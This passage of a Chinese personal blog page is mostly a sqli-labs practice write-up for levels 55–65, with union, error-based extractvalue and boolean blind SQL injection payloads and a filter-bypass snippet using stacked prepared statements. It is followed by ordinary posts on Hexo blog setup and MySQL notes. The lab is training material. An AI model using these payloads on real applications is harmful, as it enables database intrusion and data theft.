<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;challenges&#x27;</span><span class="comment">--+  // t89wk1bnp6</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;challenges&#x27;</span> <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="string">&#x27;t89wk1bnp6&#x27;</span><span class="comment">--+  // id,sessid,secret_PQ3L,tryy</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat_ws(<span class="string">&#x27;^^&#x27;</span>,id,sessid,secret_PQ3L,tryy) separator <span class="string">&#x27;/\\&#x27;</span>),<span class="number">3</span> <span class="keyword">from</span> t89wk1bnp6<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>搞定了</p>
<h1 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h1><p>流程和上面差不多了，直接写结果吧</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&#x27;) union select 1,2,3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;challenges&#x27;</span><span class="comment">--+  // ofhhs227x3</span></span><br><span class="line"></span><br><span class="line">?id=<span class="string">&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>challenges<span class="string">&#x27; and table_name=&#x27;</span>ofhhs227x3<span class="string">&#x27;--+  // id,sessid,secret_1V1K,tryy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat_ws(<span class="string">&#x27;^^&#x27;</span>,id,sessid,secret_1V1K,tryy) separator <span class="string">&#x27;/\\&#x27;</span>),<span class="number">3</span> <span class="keyword">from</span> ofhhs227x3<span class="comment">--+</span></span><br></pre></td></tr></table></figure>





<h1 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h1><p>经典 单引号 换成 双引号</p>
<p>下一个</p>
<h1 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h1><p>可查询的次数更少了</p>
<p>尝试</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">id</span>=&#x27; union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>

<p>时，结果和 id=1 时一样，双引号没结果，不知道为什么</p>
<p>把 联合查询的第一个值改为 2 ，结果也会变为 id=2 的结果</p>
<p>。。。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = array_reverse(<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure>

<p>原来是他这用户密码是乱给的，我就说我密码全改 123 了怎么不太对</p>
<p>但我尝试 单引号 的时候已经发现了有报错信息</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;challenges&#x27;</span>)))<span class="comment">--+  // xen80ozgy3</span></span><br><span class="line"></span><br><span class="line">?id=<span class="string">&#x27; or extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>challenges<span class="string">&#x27; and table_name=&#x27;</span>xen80ozgy3<span class="string">&#x27;)))--+  //  id,sessid,secret_VBW6,tryy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 报错信息好像有长度限制，所以只查一列</span></span><br><span class="line"><span class="string">?id=&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(<span class="keyword">select</span> group_concat(secret_VBW6) <span class="keyword">from</span> xen80ozgy3)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h1 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h1><p>数字型注入</p>
<p>他用户密码好像还是乱给的，报错注入还是可以用</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">or</span> extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;challenges&#x27;</span>)))<span class="comment">--+  // 7fewsuclfg</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1</span> <span class="keyword">or</span> extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;challenges&#x27;</span> <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="string">&#x27;7fewsuclfg&#x27;</span>)))<span class="comment">--+  // secret_UR5U</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1</span> <span class="keyword">or</span> extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(<span class="keyword">select</span> group_concat(secret_UR5U) <span class="keyword">from</span> <span class="number">7</span>fewsuclfg)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h1 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h1><p>双引号加圆括号闭合，试双引号的时候报错直接把括号爆出来了</p>
<p>联合查询依然没用</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>&quot;) or extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;)))--+  // 8jukx7vl5t</span><br><span class="line"></span><br><span class="line">?id=1&quot;) <span class="keyword">or</span> extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;challenges&#x27;</span> <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="string">&#x27;8jukx7vl5t&#x27;</span>)))<span class="comment">--+  // secret_OBM5</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">1</span>&quot;) or extractvalue(0x0a,concat(0x0a,(select group_concat(secret_OBM5) from 8jukx7vl5t)))--+</span><br></pre></td></tr></table></figure>





<h1 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h1><p>单引号，两个括号，报错注入</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error <span class="keyword">in</span> <span class="keyword">function</span> <span class="built_in">column_name</span>()You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">&#x27;66e8dbfgkg WHERE id=1&#x27;</span> at <span class="type">line</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>给爷整无语了，再改</p>
<p> 第63行，这种列名表名都用反引号括起来</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&#x27;)) or extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27;)))--+  // 66e8dbfgkg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=&#x27;</span>)) <span class="keyword">or</span> extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;challenges&#x27;</span> <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="string">&#x27;66e8dbfgkg&#x27;</span>)))<span class="comment">--+  // secret_BISU</span></span><br><span class="line"></span><br><span class="line">?id=<span class="string">&#x27;)) or extractvalue(0x0a,concat(0x0a,(select group_concat(secret_BISU) from `66e8dbfgkg`)))--+</span></span><br></pre></td></tr></table></figure>



<p>破案了，之前一直有的时候，感觉没问题的突然就给我报语法错误，可能也是关键字冲突了</p>
<h1 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h1><p>给 130 次机会应该是要盲注了</p>
<p>可以用布尔盲注</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;) union <span class="keyword">select</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,-<span class="number">1</span>),<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>sqlmap 不知道行不行</p>
<p>sql布尔盲注注到一半重置了，会得到错误的结果</p>
<p>而且因为有缓存，他拒绝重新注入一遍</p>
<p>缓存数据好像用的是 sqlite ，我没用过奥</p>
<p>有机会自己写个脚本吧</p>
<h1 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h1><p>好像还是可以布尔盲注</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union <span class="keyword">select</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,-<span class="number">1</span>),<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h1 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h1><p>好像还是可以布尔盲注</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1)) union select <span class="keyword">if</span>(<span class="attribute">1</span>=2,1,-1),2,3--+</span><br></pre></td></tr></table></figure>



<h1 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h1><p>测试有没有括号的时候可以</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&quot;--+</span><br></pre></td></tr></table></figure>

<p>然后在双引号后面加 ) 括号，有信息显示就代表没有语法错误</p>
<p>好像还是布尔盲注</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&quot;) union select if(1=1,1,-1),2,3--+</span></span><br></pre></td></tr></table></figure>



<h1 id="结束了"><a href="#结束了" class="headerlink" title="结束了"></a>结束了</h1><p>less-66 以后的都没了，只有链接没有文件，github上面的也没有，应该不是我的问题吧</p>
<p>网上有说一些关卡要用到tomcat，源码里确实有个 tomcat-files.zip，里面是 29-32 的 jsp 文件，但29-32也有php写的，不知道有没有什么区别，jsp没学过，好像和 java 有关</p>
<p>堆叠注入加上预编译绕过过滤还没用上，放一段吧（网上看来的）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span>concat(<span class="string">&#x27;...&#x27;</span>,<span class="string">&#x27;...&#x27;</span>);<span class="keyword">prepare</span> ins <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> ins;</span><br><span class="line"></span><br><span class="line">可以把关键字，如 <span class="keyword">select</span> 拆开，拆成 sel和ect，然后再拼起来</span><br><span class="line">可以绕过那种递归替换的（无法用双写绕过）。需要堆叠注入</span><br></pre></td></tr></table></figure>

<p> sqli-labs在github上面的最后更新时间还是 2014 年。现在 php7 中删去了 mysql_ 开头的函数，可以用mysqli_ 开头的函数替代（如果想用 php7 而不是php5 的话），github上面好像有人改成了php7可以使用的版本（不止一个）。网上还有教在linux下用shell脚本把源码中的 mysql_ 全部替换成 mysqli_ 的，据说也可以</p>
<p>但我用phpstudy 可以切换php的版本（感觉这样比较灵活）</p>
<p>盲注脚本以后再补</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/01/14/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Yuumi.jpg">
      <meta itemprop="name" content="x4297">
      <meta itemprop="description" content="开摆!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="x4297's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/14/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" class="post-title-link" itemprop="url">使用hexo搭建博客</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-14 20:22:24 / 修改时间：23:56:31" itemprop="dateCreated datePublished" datetime="2022-01-14T20:22:24+08:00">2022-01-14</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文记录了如何在windows系统中使用hexo搭建博客，并部署到github pages</p>
<h1 id="安装-git-和-node-js"><a href="#安装-git-和-node-js" class="headerlink" title="安装 git 和 node.js"></a>安装 git 和 node.js</h1><p>git可以在国内镜像下载，以下为清华大学开源软件镜像站git的下载地址</p>
<p><a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/github-release/git-for-windows/git/">https://mirrors.tuna.tsinghua.edu.cn/github-release/git-for-windows/git/</a></p>
<p>使用 git bash 可以在 windows 上使用 linux 的命令</p>
<p>在<a target="_blank" rel="noopener" href="https://nodejs.org/en/">node.js官网</a>下载安装包，下载速度还行，安装时使用默认配置</p>
<p>使用 <code>node -v</code> 查看node.js版本，使用<code>npm -v</code> 查看npm（Node Package Manager）版本，验证是否安装成功</p>
<p><img src="/images/1.png"></p>
<h1 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h1><p>国外的源一般都比较慢，所以先给npm换源（淘宝源）</p>
<p><code>npm config set registry https://registry.npm.taobao.org</code></p>
<p>另一种换源方法是使用cnpm</p>
<p><code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p>
<p>我选择直接换源</p>
<p>使用<code>npm config get registry</code> 可以查看当前使用的源</p>
<p><img src="/images/2.png"></p>
<p>接下来就可以安装hexo了，-g表示全局安装</p>
<p><code>npm install -g hexo-cli</code></p>
<p>全局安装，网上的说法</p>
<p><code>如果你想将其作为一个命令行工具，那么你应该将其安装到全局。这种安装方式后可以让你在任何目录下使用这个包。</code></p>
<p>新建一个文件夹，如<code>blog</code> ，将当前工作目录切换为刚创建的文件夹，输入<code>hexo init</code> 初始化，初始化时会从github上下载一些东西，初始化后文件夹内容如下，其中 _config.yml 是一个比较重要的配置文件</p>
<p><img src="/images/3.png"></p>
<p>使用 <code>hexo new &quot;使用hexo搭建博客&quot;</code> 会在 ./source/_posts/ 下新建一个markdown文件</p>
<p><img src="/images/4.png"></p>
<p>hello-world.md 是初始化后自动生成的，TEST-MTYSQL.md 是我之前创建的</p>
<p>编辑相应的 markdown 文件（Typora，vscode，Mark Text，用的不多，不知道哪个比较好用）</p>
<p>切回之前的目录，重新生成静态文件</p>
<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo <span class="keyword">generate</span></span><br></pre></td></tr></table></figure>

<p>在本地预览，ctrl+c 终止进程<br><code>hexo server</code></p>
<p><img src="/images/5.png"></p>
<p>hexo的一些命令可以简写，有点像gdb</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">hexo</span> server -&gt;</span> hexo s</span><br><span class="line"><span class="function"><span class="title">hexo</span> generate -&gt;</span> hexo g</span><br><span class="line"><span class="function"><span class="title">hexo</span> deploy -&gt;</span> hexo d  # 部署，之后会用到</span><br></pre></td></tr></table></figure>



<h1 id="部署到github-pages"><a href="#部署到github-pages" class="headerlink" title="部署到github pages"></a>部署到github pages</h1><p>需要一个github的账号</p>
<p>创建一个仓库，仓库名  &lt;any&gt;.github.io</p>
<p>如 x4297.github.io</p>
<p>之后访问博客就访问 <a href="https://x4297.github.io/">https://x4297.github.io</a></p>
<p>安装 hexo-deployer-git</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer.git <span class="comment">--save</span></span><br></pre></td></tr></table></figure>



<p>修改 _config.yml，repo是github项目的地址，新建项目时会给出，可以使用https或ssh，此处使用ssh（可以实现免密登录）</p>
<p><img src="/images/6.png"></p>
<p>github中有生成ssh密钥的教程，在git bash中输入如下命令，-C 后面的类似注释，会出现几个选项，直接回车就行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span>-keygen -t rsa -b <span class="number">4096</span> -C <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure>

<p>在对应的目录下会生成公钥和私钥</p>
<p>将公钥拷贝到github上</p>
<p>设置中有一项是 <code>SSH and GPG keys</code> </p>
<p>在那可以新增ssh密钥，将公钥复制进去就行（public）</p>
<p>可以测试ssh连接github，连上了会提示成功</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T <span class="symbol">git@</span>github.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/7.png"></p>
<p>生成静态文件后，使用 <code>hexo deploy</code> 即可完成部署</p>
<h1 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h1><p>我选择了next主题，先将仓库克隆到本地，放在 ./themes/next 目录下</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/theme-next/</span>hexo-theme-<span class="keyword">next</span> themes/<span class="keyword">next</span></span><br></pre></td></tr></table></figure>

<p>在 ./_config.yml 中，修改theme 为 next</p>
<p><img src="/images/8.png"></p>
<p>这个时候已经换好主题了，但还可以做一些别的修改，比如将 ./_config.yml 中的标题、副标题、描述、作者、语言时区等等，改为想要的</p>
<p>在 ./themes/next/_config.yml 中可以修改一些样式，如头像，next主题提供了四种sheme，也在这修改</p>
<p><img src="/images/9.png"></p>
<p>头像是avatar ，url 是 相对 ./themes/next/source/ 的路径，把文件放到相应目录即可，rounded为true表示头像是圆的，rotated为true表示鼠标放在头像上头像会旋转</p>
<p><img src="/images/10.png"></p>
<p>生成静态文件后重新部署即可更换主题</p>
<h1 id="文章中插入图片"><a href="#文章中插入图片" class="headerlink" title="文章中插入图片"></a>文章中插入图片</h1><p>网上一查，三四篇一样的，没怎么看懂，以后再研究那种方法。从b站学了一手，在 ./source/ 目录下新建一个 images 目录，然后将图片放在这里面</p>
<p><img src="/images/11.png"></p>
<p>写 markdown 的时候如下，无法预览图片，只能在部署后查看（images前面不加 / 好像会出点问题）</p>
<p><img src="/images/12.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/01/14/TEST-MYSQL/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Yuumi.jpg">
      <meta itemprop="name" content="x4297">
      <meta itemprop="description" content="开摆!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="x4297's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/14/TEST-MYSQL/" class="post-title-link" itemprop="url">TEST_MYSQL</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-14 15:53:25 / 修改时间：20:12:29" itemprop="dateCreated datePublished" datetime="2022-01-14T15:53:25+08:00">2022-01-14</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ul>
<li><h2 id="show-create-table-lt-tablename-gt"><a href="#show-create-table-lt-tablename-gt" class="headerlink" title="show create table &lt;tablename&gt;;"></a>show create table <code>&lt;tablename&gt;</code>;</h2><blockquote>
<p>查看创建表所需的 sql 语句</p>
<p>可以查看出默认的约束名（建表时未指定）constraint</p>
<p>主键约束名默认为 ‘PRIMARY’</p>
<p>unique约束名默认为 列名</p>
<p>主键约束建立时同时自动建立索引</p>
<p>unique约束建立同时自动建立索引</p>
</blockquote>
</li>
<li><h2 id="describe-lt-tablename-gt"><a href="#describe-lt-tablename-gt" class="headerlink" title="describe &lt;tablename&gt;;"></a>describe <code>&lt;tablename&gt;</code>;</h2><blockquote>
<p>查看表的结构</p>
</blockquote>
</li>
<li><h2 id="show-index-from-lt-tablename-gt"><a href="#show-index-from-lt-tablename-gt" class="headerlink" title="show index from &lt;tablename&gt;;"></a>show index from <code>&lt;tablename&gt;</code>;</h2><blockquote>
<p>查看索引</p>
</blockquote>
</li>
<li><h2 id="在数据库information-schema中查看约束关系"><a href="#在数据库information-schema中查看约束关系" class="headerlink" title="在数据库information_schema中查看约束关系"></a>在数据库information_schema中查看约束关系</h2><blockquote>
<p>INFORMATION_SCHEMA.TABLE_CONSTRAINT</p>
</blockquote>
</li>
<li><h2 id="join多表连接"><a href="#join多表连接" class="headerlink" title="join多表连接"></a>join多表连接</h2><blockquote>
<p>左右外连接， 内连接</p>
<p>left  (outer)  join <code>&lt;tablename&gt;</code> on   /       inner  join </p>
<p>不支持 outer  join，必须左或右</p>
</blockquote>
</li>
<li><h2 id="特性-or-bug？"><a href="#特性-or-bug？" class="headerlink" title="特性 or bug？"></a>特性 or bug？</h2><ul>
<li>网上说在mysql老版本，check约束就是个摆设，mysql并没有实现它（8.0以前？）</li>
<li>插入外键建表时直接在列名后用references指定，外键并没有插入，但也没报错</li>
</ul>
</li>
<li><h2 id="外键约束不能传递"><a href="#外键约束不能传递" class="headerlink" title="外键约束不能传递"></a>外键约束不能传递</h2><ul>
<li>外键约束无法避免一个学生修了一门课程（有这门课的成绩记录）但没有修先修课程</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/01/14/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Yuumi.jpg">
      <meta itemprop="name" content="x4297">
      <meta itemprop="description" content="开摆!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="x4297's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/14/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-14 15:27:58" itemprop="dateCreated datePublished" datetime="2022-01-14T15:27:58+08:00">2022-01-14</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

